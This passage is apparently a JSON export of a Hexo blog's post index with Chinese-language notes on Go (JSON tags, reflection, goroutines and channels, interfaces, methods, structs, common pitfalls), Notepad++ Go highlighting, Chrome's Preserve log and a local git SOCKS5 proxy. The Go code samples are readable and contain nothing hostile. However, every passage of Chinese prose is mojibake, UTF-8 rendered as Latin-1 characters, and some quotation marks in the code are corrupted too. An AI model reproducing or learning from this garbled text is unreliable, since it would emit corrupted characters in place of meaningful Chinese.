Dataä¸‹Notepad++ç›®å½•çš„userDefineLang.xml å¦‚æœæ­¤æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°±ç›´æ¥å°†userDefineLang_Go.xmlå¦å­˜ä¸ºuserDefineLang.xmlï¼Œé¦–å°¾æ³¨é‡Šå»æ‰ C:\\Users[username]\\AppData\\Roaming\\Notepad++ å°†go.xmlæ–‡ä»¶copyè‡³notepadå®‰è£…ç›®å½•ä¸‹çš„plugins\\APIsç›®å½•(ä¾‹å¦‚ï¼šD:\\Program Files\\Notepad\\plugins\\APIs)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go json æ ‡ç­¾ä½¿ç”¨å°æŠ€å·§","slug":"history/tech/5a12eb5e4b0d20bd5c4f7b40","date":"2017-11-20T02:49:02.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a12eb5e4b0d20bd5c4f7b40/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a12eb5e4b0d20bd5c4f7b40/","excerpt":"","text":"å½“ä½ åˆ›å»ºä¸€ä¸ªç»“æ„ä½“çš„æ—¶å€™ï¼Œè¿™ä¸ªç»“æ„ä½“éœ€è¦åœ¨å…¶ä»–ç±»ä¸­ä¿®æ”¹å†…éƒ¨çš„å˜é‡ æˆ‘ä»¬å®šä¹‰ä¸ºå¤–éƒ¨å¯è®¿é—®çš„å˜é‡ã€‚type test struct {Con string}æ‰“å°å‡ºjson çš„æ•ˆæœ:a := test{â€œ12â€}data, _ := json.Marshal(a)fmt.Println(string(data)){â€œConâ€:â€œ12â€}ä½†æ˜¯è¿™ä¸ªæ—¶å€™ï¼Œå˜é‡æ˜¯å¤§å°çš„ï¼Œæˆ‘åœ¨åšjsonæ•°æ®ä¼ è¾“çš„æ—¶å€™ï¼Œä¸å¸Œæœ›æ˜¯å¤§å†™ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ json æ ‡ç­¾æŠ€å·§ã€‚type test struct {Con stringjson:&quot;con,omitempty&quot;}å†æ¬¡æ‰“å°json:{â€œconâ€:â€œ12â€}æ›´å¤šæŠ€å·§ï¼Œå¾…è¡¥å……ã€‚ã€‚ã€‚ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"chrome é¡µé¢è·³è½¬ä¿ç•™æ—¥å¿—åŠŸèƒ½  Preserve log","slug":"history/tech/5a12ae524b0d20bd5c4f7b3f","date":"2017-11-19T22:28:34.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a12ae524b0d20bd5c4f7b3f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a12ae524b0d20bd5c4f7b3f/","excerpt":"","text":"Preserve log åœ¨é¡µé¢è·³è½¬åï¼Œæ§åˆ¶å°å’Œç½‘ç»œæ§åˆ¶å°çš„å†…å®¹æš‚æ—¶ä¸æ¸…ç©ºï¼Œä¿ç•™ä¸‹æ¥ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go &^ è¿ç®—","slug":"history/tech/5a129fe54b0d20bd5c4f7b3e","date":"2017-11-19T21:27:01.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a129fe54b0d20bd5c4f7b3e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a129fe54b0d20bd5c4f7b3e/","excerpt":"","text":"go &amp;^ è¿ç®—","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go åå°„ç»ƒä¹ ","slug":"history/tech/5a100d4e4b0d20bd5c4f7b3d","date":"2017-11-17T22:37:02.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a100d4e4b0d20bd5c4f7b3d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a100d4e4b0d20bd5c4f7b3d/","excerpt":"","text":"ä»£ç :package main import ( &quot;fmt&quot; &quot;reflect&quot; ) type User struct { Id int Name string Age int } func (u User) Hello() { fmt.Println(&quot;Hello World&quot;) } func main() { /* åŸºæœ¬ç±»å‹ */ var x float64 = 1.1 //TypeOf fmt.Println(&quot;-----------------TypeOf------------------&quot;) fmt.Println(&quot;reflect.TypeOf(x):&quot;, reflect.TypeOf(x)) fmt.Println(&quot;reflect.TypeOf(x).Kind():&quot;, reflect.TypeOf(x).Kind()) //ValueOf fmt.Println(&quot;-----------------ValueOf-----------------&quot;) fmt.Println(&quot;reflect.ValueOf(x):&quot;, reflect.ValueOf(x)) fmt.Println(&quot;reflect.ValueOf(x).Type():&quot;, reflect.ValueOf(x).Type()) fmt.Println(&quot;reflect.ValueOf(x).Canset():&quot;, reflect.ValueOf(x).CanSet()) fmt.Println(&quot;reflect.ValueOf(&amp;x).Elem():&quot;, reflect.ValueOf(&amp;x).Elem()) fmt.Println(&quot;reflect.ValueOf(&amp;x).Elem().CanSet():&quot;, reflect.ValueOf(&amp;x).Elem().CanSet()) reflect.ValueOf(&amp;x).Elem().SetFloat(1.21) fmt.Println(&quot;reflect.ValueOf(&amp;x).Elem().Interface():&quot;, reflect.ValueOf(&amp;x).Elem().Interface()) /* struct */ fmt.Println(&quot;-----------------struct-----------------&quot;) u := User{1, &quot;ok&quot;, 12} fmt.Println(reflect.TypeOf(u).Kind() == reflect.Struct) for i := 0; i &lt; reflect.TypeOf(u).NumField(); i++ { fmt.Printf(&quot;å­—æ®µ: %6s\\n&quot;, reflect.TypeOf(u).Field(i)) fmt.Printf(&quot;å­—æ®µå: %6s | å­—æ®µç±»å‹: %v | å­—æ®µå€¼: %v\\n&quot;, reflect.TypeOf(u).Field(i).Name, reflect.TypeOf(u).Field(i).Type, reflect.ValueOf(u).Field(i).Interface()) } for i := 0; i &lt; reflect.TypeOf(u).NumMethod(); i++ { fmt.Printf(&quot;reflect.TypeOf(u).Method(i).Name: %6s\\n reflect.TypeOf(u).Method(i).Type: %v\\n&quot;, reflect.TypeOf(u).Method(i).Name, reflect.TypeOf(u).Method(i).Type) } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"git socks5 ä»£ç†","slug":"history/tech/5a0f06cbd102fd2345a053a2","date":"2017-11-17T03:56:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0f06cbd102fd2345a053a2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0f06cbd102fd2345a053a2/","excerpt":"","text":"è®¾ç½®ssgit config --global http.proxy 'socks5://127.0.0.1:1080' git config --global https.proxy 'socks5://127.0.0.1:1080' è®¾ç½®ä»£ç†git config --global https.proxy http://127.0.0.1:1080 git config --global https.proxy https://127.0.0.1:1080 å–æ¶ˆä»£ç†git config --global --unset http.proxy git config --global --unset https.proxy å‚è€ƒï¼šhttps://gist.github.com/laispace/666dd7b27e9116faece6","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go concurrency","slug":"history/tech/5a0e5124d102fd2345a053a0","date":"2017-11-17T03:01:56.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0e5124d102fd2345a053a0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0e5124d102fd2345a053a0/","excerpt":"","text":"concurrencypackage main import ( &quot;fmt&quot; &quot;time&quot; ) func main() { go Go() time.Sleep(2 * time.Second) } func Go() { fmt.Println(&quot;Go Go Go!!!&quot;) } ä½¿ç”¨chanpackage main import ( &quot;fmt&quot; ) func main() { c := make(chan bool) go func(){ fmt.Println(&quot;Go Go Go!!!&quot;) c &lt;- true }() &lt;-c } for ç‰ˆæœ¬package main import ( &quot;fmt&quot; ) func main() { c := make(chan bool) go func() { fmt.Println(&quot;Go Go Go!!!&quot;) c &lt;- true close(c) }() for v := range c { fmt.Println(v) } } æœ‰ç¼“å­˜å’Œæ²¡æœ‰ç¼“å­˜çš„ chanpackage main import ( &quot;fmt&quot; ) func main() { c := make(chan bool) //c := make(chan bool, 1) go func() { fmt.Println(&quot;Go Go Go!!!&quot;) &lt;-c }() c &lt;- true } å¤šä¸ªåç¨‹package main import ( &quot;fmt&quot; ) func main() { c := make(chan bool) for i := 0; i &lt; 10; i++ { go Go(c, i) } &lt;-c } func Go(c chan bool, index int) { a := 1 for i := 0; i &lt; 10000000; i++ { a += i } fmt.Println(index, a) if index == 9 { c &lt;- true } } 10ä¸ªç¼“å­˜å¹¶ä½¿ç”¨ å¤šæ ¸çš„ç‰ˆæœ¬package main import ( &quot;fmt&quot; &quot;runtime&quot; ) func main() { runtime.GOMAXPROCS(runtime.NumCPU()) c := make(chan bool, 10) for i := 0; i &lt; 10; i++ { go Go(c, i) } for i := 0; i &lt; 10; i++ { &lt;-c } } func Go(c chan bool, index int) { a := 1 for i := 0; i &lt; 10000000; i++ { a += i } fmt.Println(index, a) c &lt;- true } wait group ç‰ˆpackage main import ( &quot;fmt&quot; &quot;runtime&quot; &quot;sync&quot; ) func main() { runtime.GOMAXPROCS(runtime.NumCPU()) wg := sync.WaitGroup{} wg.Add(10) for i := 0; i &lt; 10; i++ { go Go(&amp;wg, i) } wg.Wait() } func Go(wg *sync.WaitGroup, index int) { a := 1 for i := 0; i &lt; 10000000; i++ { a += i } fmt.Println(index, a) wg.Done() } selectpackage main import ( &quot;fmt&quot; ) func main() { c1, c2 := make(chan int), make(chan string) o := make(chan bool, 2) go func() { for { select { case v, ok := &lt;-c1: if !ok { fmt.Println(&quot;c1 !ok&quot;) o &lt;- true break } fmt.Println(&quot;c1&quot;, v) case v, ok := &lt;-c2: if !ok { fmt.Println(&quot;c2 !ok&quot;) o &lt;- true break } fmt.Println(&quot;c2&quot;, v) } } }() c1 &lt;- 1 c2 &lt;- &quot;hi&quot; c1 &lt;- 3 c2 &lt;- &quot;hello&quot; close(c1) close(c2) for i := 1; i &lt; 2; i++ { &lt;-o } } ä½¿ç”¨ select å‘é€package main import ( &quot;fmt&quot; ) func main() { c := make(chan int) go func() { for v := range c { fmt.Println(v) } }() for { select { case c &lt;- 0: case c &lt;- 1: } } } chan è¶…æ—¶package main import ( &quot;fmt&quot; &quot;time&quot; ) func main() { c := make(chan bool) select { case v := &lt;-c: fmt.Println(v) case &lt;-time.After(3 * time.Second): fmt.Println(&quot;timeout&quot;) } } åˆ›å»ºä¸€ä¸ª goroutineï¼Œä¸ä¸»çº¿ç¨‹æŒ‰é¡ºåºç›¸äº’å‘é€ä¿¡æ¯è‹¥å¹²æ¬¡å¹¶æ‰“å°package main import ( &quot;fmt&quot; ) var c chan string func Pingpong() { i := 0 for { fmt.Println(&lt;-c) c &lt;- fmt.Sprintf(&quot;From Pingpong:Hi, #%d&quot;, i) i++ } } func main() { c = make(chan string) go Pingpong() for i := 0; i &lt; 10; i++ { c &lt;- fmt.Sprintf(&quot;From main: Hello,#%d&quot;, i) fmt.Println(&lt;-c) } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go åå°„","slug":"history/tech/5a0e4324d102fd2345a0539f","date":"2017-11-17T02:02:12.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0e4324d102fd2345a0539f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0e4324d102fd2345a0539f/","excerpt":"","text":"åå°„package main import ( &quot;fmt&quot; &quot;reflect&quot; ) type User struct { Id int Name string Age int } func (u User) Hello() { fmt.Println(&quot;Hello World&quot;) } func main() { u := User{1, &quot;ok&quot;, 12} Info(u) } func Info(o interface{}) { t := reflect.TypeOf(o) fmt.Println(&quot;Type:&quot;, t.Name()) if k := t.Kind(); k != reflect.Struct { fmt.Println(&quot;xxxx&quot;) return } v := reflect.ValueOf(o) fmt.Println(&quot;Fields:&quot;) for i := 0; i &lt; t.NumField(); i++ { f := t.Field(i) val := v.Field(i).Interface() fmt.Printf(&quot;%6s: %v = %v\\n&quot;, f.Name, f.Type, val) } for i := 0; i &lt; t.NumMethod(); i++ { m := t.Method(i) fmt.Printf(&quot;%6s: %v\\n&quot;, m.Name, m.Type) } } è·å–å­—æ®µå†…å®¹package main import ( &quot;fmt&quot; &quot;reflect&quot; ) type User struct { Id int Name string Age int } type Manager struct { User title string } func main() { m := Manager{User: User{1, &quot;ok&quot;, 12}, title: &quot;123&quot;} t := reflect.TypeOf(m) fmt.Printf(&quot;%#v\\n&quot;, t.FieldByIndex([]int{0, 0})) } é€šè¿‡åå°„ä¿®æ”¹åŸºæœ¬ç±»å‹package main import ( &quot;fmt&quot; &quot;reflect&quot; ) func main() { x := 123 v := reflect.ValueOf(&amp;x) v.Elem().SetInt(999) fmt.Println(x) } é€šè¿‡åå°„å¯¹æ¥å£ä¸­çš„å¯¹è±¡çš„å€¼è¿›è¡Œä¿®æ”¹package main import ( &quot;fmt&quot; &quot;reflect&quot; ) type User struct { Id int Name string Age int } func main() { u := User{1, &quot;ok&quot;, 12} Set(&amp;u) fmt.Println(u) } func Set(o interface{}) { v := reflect.ValueOf(o) if v.Kind() == reflect.Ptr &amp;&amp; !v.Elem().CanSet() { fmt.Println(&quot;xx&quot;) return } v = v.Elem() f := v.FieldByName(&quot;Name&quot;) if !f.IsValid() { fmt.Println(&quot;BAD&quot;) return } if f.Kind() == reflect.String { f.SetString(&quot;BYEBYE&quot;) } } é€šè¿‡åå°„è¿›è¡Œæ–¹æ³•è°ƒç”¨package main import ( &quot;fmt&quot; &quot;reflect&quot; ) type User struct { Id int Name string Age int } func (u User) Hello(name string) { fmt.Println(&quot;Hello&quot;, name, &quot;, my name is&quot;, u.Name) } func main() { u := User{1, &quot;ok&quot;, 12} u.Hello(&quot;wang&quot;) v := reflect.ValueOf(u) mv := v.MethodByName(&quot;Hello&quot;) args := []reflect.Value{reflect.ValueOf(&quot;wang&quot;)} mv.Call(args) }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go å‘","slug":"history/tech/5a0e8ea8d102fd2345a053a1","date":"2017-11-16T19:24:24.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0e8ea8d102fd2345a053a1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0e8ea8d102fd2345a053a1/","excerpt":"","text":"æ•°ç»„é”™è¯¯ç‰ˆæœ¬:package main import ( &quot;fmt&quot; ) var c chan string func Pingpong(s []int) { s = append(s, 3) } func main() { s := make([]int, 0) fmt.Println(s) Pingpong(s) fmt.Println(s) } æ•°ç»„æ¨èç‰ˆæœ¬:package main import ( &quot;fmt&quot; ) var c chan string func Pingpong(s []int) []int { s = append(s, 3) return s } func main() { s := make([]int, 0) fmt.Println(s) s = Pingpong(s) fmt.Println(s) } time å‘:package main import ( &quot;fmt&quot; &quot;time&quot; ) func main() { t := time.Now() fmt.Println(t) fmt.Println(t.Format(time.ANSIC)) fmt.Println(t.Format(&quot;Mon Jan _2 15:04:05 2006&quot;)) //è‡ªå®šä¹‰æ—¶é—´---å·¨å‘ fmt.Println(t.Format(&quot;Fri Nov 17 15:27:00 2017&quot;)) } range ä¸é—­åŒ…çš„å‘:package main import ( &quot;fmt&quot; ) func main() { s := []string{&quot;a&quot;, &quot;b&quot;, &quot;c&quot;} for _, v := range s { go func(v string) { fmt.Println(v) }(v) // è¿™é‡Œéœ€è¦ä¼ é€’å‚æ•° } select {}//è¿™é‡ŒæŠ¥é”™ï¼Œæ•…æ„åšçš„æ­»é”ï¼Œä¸ç”¨ç®¡ }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go interface","slug":"history/tech/5a0da268d102fd2345a0539e","date":"2017-11-16T02:36:24.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0da268d102fd2345a0539e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0da268d102fd2345a0539e/","excerpt":"","text":"ä¾‹ä¸€:package main import &quot;fmt&quot; type USB interface { Name() string Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { a := PhoneConnector{&quot;PhoneConnector&quot;} a.Connect() Disconnect(a) } func Disconnect(usb USB) { fmt.Println(&quot;Disconnected.&quot;) } ä¾‹äºŒ:package main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { a := PhoneConnector{&quot;PhoneConnector&quot;} a.Connect() Disconnect(a) } func Disconnect(usb USB) { fmt.Println(&quot;Disconnected.&quot;) } ä¾‹ä¸‰:package main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { a := PhoneConnector{&quot;PhoneConnector&quot;} a.Connect() Disconnect(a) } func Disconnect(usb USB) { if pc, ok := usb.(PhoneConnector); ok { fmt.Println(&quot;Disconnected.&quot;, pc.name) return } fmt.Println(&quot;unknown device.&quot;) } å‚æ•°ä¸ºç©ºæ¥å£çš„å¤„ç†æ–¹æ³•: package main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { a := PhoneConnector{&quot;PhoneConnector&quot;} a.Connect() Disconnect(a) } func Disconnect(usb interface{}) { switch v := usb.(type) { case PhoneConnector: fmt.Println(&quot;Disconnected&quot;, v.name) default: fmt.Println(&quot;Unknown device.&quot;) } } åœ¨åˆšæ‰çš„åŸºç¡€ä¸Šä¿®æ”¹mainå‡½æ•°package main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { pc := PhoneConnector{&quot;PhoneConnector&quot;} var a Connector a = Connector(pc) a.Connect() } func Disconnect(usb interface{}) { switch v := usb.(type) { case PhoneConnector: fmt.Println(&quot;Disconnected&quot;, v.name) default: fmt.Println(&quot;Unknown device.&quot;) } } æ— æ³•äº’ç›¸è½¬åŒ–çš„æƒ…å†µ:package main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } type TVConnector struct { name string } func (tv TVConnector) Connect() { fmt.Println(&quot;Connected:&quot;, tv.name) } func main() { tv := TVConnector{&quot;TVConnector&quot;} var a USB a = USB(tv) a.Connect() } func Disconnect(usb interface{}) { switch v := usb.(type) { case PhoneConnector: fmt.Println(&quot;Disconnected&quot;, v.name) default: fmt.Println(&quot;Unknown device.&quot;) } } å°†å¯¹è±¡èµ‹å€¼ç»™æ¥å£æ—¶ï¼Œä¼šå‘ç”Ÿæ‹·è´ï¼Œè€Œæ¥å£å†…éƒ¨å­˜å‚¨çš„æ˜¯æŒ‡å‘è¿™ä¸ªå¤åˆ¶å“çš„æŒ‡é’ˆï¼Œæ—¢æ— æ³•ä¿®æ”¹å¤åˆ¶å“çš„çŠ¶æ€ï¼Œä¹Ÿæ— æ³•è·å–æŒ‡é’ˆpackage main import &quot;fmt&quot; type USB interface { Name() string Connector } type Connector interface { Connect() } type PhoneConnector struct { name string } func (pc PhoneConnector) Name() string { return pc.name } func (pc PhoneConnector) Connect() { fmt.Println(&quot;Connected:&quot;, pc.name) } func main() { pc := PhoneConnector{&quot;PhoneConnector&quot;} var a Connector a = Connector(pc) a.Connect() //å®Œå…¨æ— è§†å¯¹åŸæ¥å¯¹è±¡çš„ä¿®æ”¹ï¼Œå› æ­¤ä»–å¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ‹·è´ pc.name = &quot;pc&quot; a.Connect() } func Disconnect(usb interface{}) { switch v := usb.(type) { case PhoneConnector: fmt.Println(&quot;Disconnected&quot;, v.name) default: fmt.Println(&quot;Unknown device.&quot;) } } åªæœ‰å½“æ¥å£å­˜å‚¨çš„ç±»å‹å’Œå¯¹è±¡éƒ½ä¸ºnilæ—¶ï¼Œæ¥å£æ‰ç­‰äºnilpackage main import &quot;fmt&quot; func main() { var a interface{} fmt.Println(a == nil) var p *int = nil a = p fmt.Println(a == nil) }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go ç›¸å…³ç½‘ç«™","slug":"history/tech/5a0d9738d102fd2345a0539d","date":"2017-11-16T01:48:40.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0d9738d102fd2345a0539d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0d9738d102fd2345a0539d/","excerpt":"","text":"http://gowalker.org/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go method","slug":"history/tech/5a0d9133d102fd2345a0539c","date":"2017-11-16T01:22:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0d9133d102fd2345a0539c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0d9133d102fd2345a0539c/","excerpt":"","text":"å®šä¹‰å‡½æ•°æ¥æ”¶è€…package main import ( &quot;fmt&quot; ) type A struct { Name string } type B struct { Name string } func main() { a := A{} a.print() fmt.Println(a.Name) b := B{} b.print() fmt.Println(b.Name) } //è¿™é‡Œå®šä¹‰äº†å‡½æ•°çš„æ¥æ”¶è€… func (a *A) print() { a.Name = &quot;AA&quot; fmt.Println(&quot;A&quot;) } func (b B) print() { b.Name = &quot;BB&quot; fmt.Println(&quot;B&quot;) } ç»™ int æ·»åŠ æ–¹æ³•(æ–¹æ³•ç»‘å®šå¿…é¡»åœ¨ç›¸åŒåŒ…ä¸­)package main import &quot;fmt&quot; type Test int func main() { var a Test a.print() } func (test Test) print() { fmt.Println(&quot;test&quot;) } Method Values å’Œ Method Expressionspackage main import &quot;fmt&quot; type Test int func main() { var a Test //Method Values a.print() // Method Expressions (*Test).print(&amp;a) } func (test *Test) print() { fmt.Println(&quot;test&quot;) } ç»™è‡ªå®šä¹‰ç±»å‹æ·»åŠ æ–¹æ³•package main import &quot;fmt&quot; type Test int func main() { var a Test a.increase(10) fmt.Println(a) } func (test *Test) increase(num Test) { *test += num }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go struct","slug":"history/tech/5a0d748fd102fd2345a0539b","date":"2017-11-15T23:20:47.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0d748fd102fd2345a0539b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0d748fd102fd2345a0539b/","excerpt":"","text":"ç¬¬ä¸€ç§åˆå§‹åŒ–æ–¹æ³•:package main import ( &quot;fmt&quot; ) type person struct { Name string Age int } func main() { a := person{} a.Name = &quot;wang&quot; a.Age = 20 fmt.Println(a) } ç¬¬äºŒç§åˆå§‹åŒ–æ–¹æ³•:package main import ( &quot;fmt&quot; ) type person struct { Name string Age int } func main() { a := person{ Name: &quot;wang&quot;, Age: 22, } fmt.Println(a) } ç¬¬ä¸‰ç§åˆå§‹åŒ–æ–¹æ³•:(åŒ¿åç»“æ„)package main import ( &quot;fmt&quot; ) func main() { a := struct { Name string Age int }{ Name: &quot;wang&quot;, Age: 22, } fmt.Println(a) } åµŒå¥—åŒ¿åç»“æ„package main import ( &quot;fmt&quot; ) type person struct { Name string Age int //Contact ä¸ºåŒ¿åç»“æ„ Contact struct { Phone, City string } } func main() { a := person{Name: &quot;wang&quot;, Age: 19} //Contact ä¸ºåŒ¿åç»“æ„ï¼Œåªèƒ½æŒ‰ç…§å¦‚ä¸‹æ–¹æ³•åˆå§‹åŒ– a.Contact.City = &quot;bj&quot; a.Contact.Phone = &quot;111&quot; fmt.Println(a) } æ³¨æ„: struct ä¸ºå€¼ç±»å‹ï¼Œ æ‰€ä»¥åœ¨å®šä¹‰çš„æ—¶å€™ï¼ŒåŠ ä¸Š &amp; ç¬¦å·ï¼Œä¾¿äºä¿®æ”¹ struct ä¸­å†…å®¹ï¼Œ å¦‚ a := &amp;person{ Name string Age int }{ Name: &quot;wang&quot;, Age: 22, } åŒ¿åå­—æ®µpackage main import ( &quot;fmt&quot; ) type person struct { string int } func main() { a := person{&quot;wang&quot;, 19} fmt.Println(a) } ç›¸äº’èµ‹å€¼/æ¯”è¾ƒpackage main import ( &quot;fmt&quot; ) type person struct { string int } func main() { a := person{&quot;wang&quot;, 19} b := person{&quot;wang&quot;, 19} c := a // æ³¨æ„ å¿…é¡» ç±»å‹ç›¸åŒæ‰èƒ½æ¯”è¾ƒ fmt.Println(a == b) fmt.Println(c) } åŒ¿ååµŒå…¥ç»“æ„package main import ( &quot;fmt&quot; ) type human struct { sex int } type student struct { //åŒ¿ååµŒå…¥ç»“æ„ï¼Œé»˜è®¤æŠŠhumanå½“ä½œkeyå human Name string Age int } func main() { a := student{Name: &quot;wang&quot;, Age: 19, human: human{sex: 0}} fmt.Println(a) } ç»“æ„ä½“åµŒå¥—å­—æ®µå–å€¼package main import ( &quot;fmt&quot; ) type A struct { Name string } type B struct { A } func main() { b := B{A: A{Name: &quot;wang&quot;}} fmt.Println(b.Name, b.A.Name) 